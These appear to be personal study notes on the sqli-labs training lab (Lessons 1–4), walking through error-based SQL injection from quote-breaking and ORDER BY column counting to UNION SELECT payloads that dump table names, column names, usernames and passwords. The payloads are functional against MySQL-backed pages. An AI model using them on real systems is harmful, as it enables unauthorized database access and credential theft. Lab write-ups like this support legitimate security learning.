# Less-1,Less-2,Less-3 **Error Based- String**

Lesson 1 and 2 starts here

So sqli-labs here we go,

http://localhost:8000/Less-1/?id=1

So here we are presented with a url which has id as a parameter and changing the id values will yield us with a login name and corresponding password, Which is different for every id.(The method of testing different inputs to find a malicious query is called fuzzing)

So from initial analysis we could frame a pseoudo query like this

select login_name,password from some_table where id=user_input

lets say we add a single qoute to out url then we'll get an error like this

aah the legendary response 

```You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1```

Lets collect the info we want from the error, this line looks interesting             ''1'' LIMIT 0,1'

The first thing that came to my mind was what is this LIMIT, see sql syntax notes to know what that is.

Now enumerating the error we see that

'  ' 1' ' LIMIT 0,1 ',  we need to ignore the first and last single qoute as it was just there to show the error message(doubt)

ie, ' 1' ' LIMIT 0,1 clearly our input 1' is visible and we now can finally understand why the error occurs it's because of unclosed single qoutes.

now lets pass something like 1\' as a parameter, Now it works because the backslash escapes the single qoute causing us no errors.

Now we know that -- is a comment in sql lets add that in our url '1'--' , it doesn't work because we have to add a space after the double hiphens '1'-- ' inorder for it be interpreted as a comment(Add %20 or +,ie space when url encoded), Now we'll the get the page for id value 1.

Here # is also a comment, we can give 1'# actually 1'%23 which is the url encoded form of 1'#, here we don't need to use a space./* */ is a multi line comment in sql.

Ok Now lets input some actual sql query ie what if our input is like this 1' AND 1=1 --, Hmm interesting this would work as the right side evaluates to true and 1' AND 1=0 -- won't work as now the right side evaluates to false.

Lesson 2 starts here

Here if we give id's value which doesn't exist in the db it will throw an error.

Unknown column 'jk' in 'where clause'

again if we give single qoute as a parameter we'll get 

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1

looking at the interesting part  '' LIMIT 0,1

lets try to construct a pseoudu query

select login_name,password from table where id=user_input


Lesson 3 starts here,

Same stuff as less 1 and less 2, but here when we give 1' as input we get the following error

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1

taking the interesting part

' 1' ') LIMIT 0,1 so judging from this error we can construct a pseoudo query

select login_name,password from table where id=('user_input'), hmm enclosed within paranthesis.

so if we give some input like  1')--+ the query will work because the patanthesis is correctly closed now.Also the + is there for the space during url encoding.


Lesson 4 starts here

Same scenario as in 1 and 3 but here when we provide single qoutes the application isn't breaking, so what will happen if we give  a double qoute?, ah now it throws an error 

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near "2"") LIMIT 0,1 at line 1, So the developer was using double qoutes to encapsulate our input that's why when we give double qoute to our input the application breaks also our input is getting inside a paranthesis, so our final payload inorder to make the query work would look something like this 2")--+, Nice..

**Column enumeration in the Query**

Going back to lab 1

According to out pseoudo query

select login_name,password from some_table where id=user_input

This is the payload for finding the number of columns  that are being referenced in the query for eg our pseoudo query has 2 columns being referenced.

select login_name,password from some_table where id='1' order by 1 -- some other query'

The resultant output will have login_name and password ordered in ascending order, incase login_name consists of words it will be ordered alaphabetically according to the first letter of the word.

similarily 

select login_name,password from some_table where id='1' order by 1 -- some other query'

will sort in ascending according to the password column.

Now giving order by 1, the page has no errors
order by 2 , the page has no errors
order by 3, the page has no errors
order by 4, the page has some error [Unknown column '4' in 'order clause']

that means there are 3 column names being referenced in the query ie something othe than login_name and password.

ie it should look something like this 

select col-1,col-2,col-3 from table where id = user_input

Now we can inject our query in the user_input field, Now using union statement to combine both the queries

we'll give some thing like this as a parameter 1' union select 1,2,3 --+ , thereby our
query will become select col_1,col_2,col_3 from table where id = '1' union select 1,2,3 -- some other query here ', Now why are we giving  select 1,2,3 in union because inorder for union to work the column number should be the same.

But when we pass 1' union select 1,2,3 --+ in the url the page would just show the regular page for id=1, Now inorder for our injected query to work somehow we have to make the left part of union statement break, so for that we can give id's value as something which is not their in the table like lets say id=999 which will break the left part of the query(will return nothing) and our right part of the query(the query that we injected) would be shown as the output for the select statement.

so our payload would look something like this 1' union select 1,2,3 --+, which would show the login name as 2 and password as 3,.... very interesting.

Now in the place of 2 we can provide some sql queries like, union select 1,version(),3 shows the version of the mysql being used, we can use union select 1,database(),3 to get the database name also we can do select 1,current_user(),3 to get the current_user , union select 1,@@datadir,3 to get the default directory where mysql stores the data.


**DUMPING**

So now we know some information about the database and mysql server on the backend.

It's time to dump the db

building up on our previous payload that is 50' union select 1,2,3 --+

we could give something like 50' union select 1,table_name,3 from information_schema.tables where table_schema='security' we could get the table names in the database security.

another example would be like this 

select id,user_name,password from sqli_users where id=50 union select 1,table_name,3 from information_schema.tables where table_schema='atbs';

Here the first and third column remains the same ie 1 and 3 and onlt the second field will be populated with the table names in the database atbs;

The above query will return something like this

+------+-----------+----------+
| id   | user_name | password |
+------+-----------+----------+
|    1 | auth      | 3        |
|    1 | test      | 3        |
|    1 | ticket    | 3        |
+------+-----------+----------+

But when we run it on the vulnerable server we'll only get the first value(In this case auth), inorder to iterate and get the next element we'll use the limit clause.

so we'll do  50' union select 1,table_name,3 from information_schema.tables where table_schema='security' limit 0,1 which means the offset is 0 and we select 1 element starting from 0(Which is the first element). Now limit 1,1 means we're starting from 1 (which is the second row) and we're selecting 1 more row (that will be second row itself) again limit 2,1 will start from 2(the third row) and will select 1 more row which will the same row itself.

In this way we can iterate through the data to get all the data. 

Now we can get the each of the table name into a single string using group_concat, also this time we need to avoid that limit this time.

So our payload would look something like this 

50' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security', With this we'll get the total table names in one single string.

Till now we have enumerated the following things
database = security
tables = emails,referers,uagents,users

Now lets start enumerating the columns

So starting with sql,

select column_name from information_schema.columns where table_name='auth';

this will show the column_names for the table 'auth' hence we could craft a payload using this like this

50' union select 1,column_name,3 from information_schema.columns where table_name='users' --+

and to concatenate it into a single string we can again use group_concat

50' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+

Hence we'll get the column names.(And now we can iterate over the tables using the respective table names)

So this is the information that we have now

database = security
tables = emails,referers,uagents,users
users table = id,username,password
uagents = id,uagent,ip_address,username

Now with this information we can now dump the actual useful information

so we could inject something like this,

50' union select 1,username,3 from users --+, we crafted this payload we enumerated column names and table names

again using concat

50' union select 1,group_concat(username),3 from users --+, we crafted this payload we enumerated column names and table names

Now for the password

50' union select 1,group_concat(password),3 from users --+ -> To get the passwords.

and now we can dump the each and every column of each and every tables of each and every database.

**Covered parts upto yt video 4**


